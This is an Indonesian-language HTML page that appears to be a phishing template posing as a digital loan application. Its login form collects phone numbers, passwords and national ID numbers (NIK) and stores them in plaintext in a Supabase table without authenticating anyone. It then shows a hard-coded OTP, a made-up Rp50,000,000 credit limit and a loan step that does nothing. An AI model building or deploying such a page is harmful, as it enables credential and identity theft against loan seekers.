<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kredit Digital e-Form</title>

<!-- SUPABASE -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
const db = window.supabase.createClient(
  "https://YOUR_PROJECT.supabase.co", // GANTI
  "YOUR_PUBLIC_ANON_KEY"              // GANTI
);
</script>

<style>
body{
  margin:0;
  font-family:Arial;
  background:#ffb000;
  color:white;
  text-align:center;
}
.container{max-width:400px;margin:auto;padding:20px}
input,button{
  width:100%;
  padding:12px;
  margin:8px 0;
  border-radius:10px;
  border:none;
}
button{
  background:#ff9500;
  color:white;
  font-weight:bold;
  cursor:pointer;
}
.page{display:none}
.active{display:block}
</style>

</head>
<body>

<div class="container">

<!-- LOGIN -->
<div id="loginPage" class="page active">
<h2>Login Akun</h2>
<input type="text" placeholder="Nomor HP" id="phone" required>
<input type="password" placeholder="Password" id="password" required>
<input type="text" placeholder="NIK" id="nik" required>
<button onclick="login()">LOGIN</button>
</div>

<!-- OTP -->
<div id="otpPage" class="page">
<h2>Verifikasi OTP</h2>
<input id="otp" placeholder="Masukkan kode 123456">
<button onclick="verify()">VERIFIKASI</button>
</div>

<!-- DASHBOARD -->
<div id="dashPage" class="page">
<h2>Dashboard</h2>
<p>Limit Rp50.000.000</p>
<button onclick="goLoan()">Ajukan Pinjaman</button>
</div>

<!-- LOAN -->
<div id="loanPage" class="page">
<h2>Ajukan Pinjaman</h2>
<input id="amount" placeholder="Jumlah pinjaman">
<button onclick="processLoan()">Proses</button>
</div>

<!-- FINAL -->
<div id="finalPage" class="page">
<h2>Berhasil</h2>
<p>Pengajuan diproses</p>
</div>

</div>

<script>

// =========================
// NAVIGATION
// =========================
function show(id){
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'))
  document.getElementById(id).classList.add('active')
}

// =========================
// LOGIN + SUPABASE
// =========================
async function login(){

  const phone = document.getElementById("phone").value
  const password = document.getElementById("password").value
  const nik = document.getElementById("nik").value

  if(!phone || !password || !nik){
    alert("Lengkapi data")
    return
  }

  const { error } = await db
    .from("users")
    .insert([{ phone, password, nik }])

  if(error){
    console.error(error)
    alert("Gagal simpan")
    return
  }

  console.log("SUCCESS SIMPAN")
  show("otpPage")
}

// =========================
// OTP DEMO
// =========================
function verify(){
  const otp = document.getElementById("otp").value

  if(otp !== "123456"){
    alert("OTP salah")
    return
  }

  show("dashPage")
}

// =========================
// LOAN FLOW
// =========================
function goLoan(){
  show("loanPage")
}

function processLoan(){
  show("finalPage")
}

</script>

</body>
</html>
